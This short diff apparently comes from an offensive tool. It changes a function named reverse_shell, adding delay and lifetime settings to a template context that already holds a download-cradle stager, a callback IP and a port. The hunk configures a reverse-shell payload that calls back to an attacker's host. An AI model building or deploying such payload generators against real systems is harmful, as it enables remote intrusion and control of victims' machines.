@@ -260,6 +260,8 @@ def reverse_shell():
     context = {
         "dl_cradle": stager_str().replace('$K', '$R'),
         "IP": args.URI_HOST,
+        "delay": 10,  # delay in seconds
+        "lifetime": 3,  # lifetime in days
         "PORT": str(args.REC_PORT),
     }
     result = render_template(
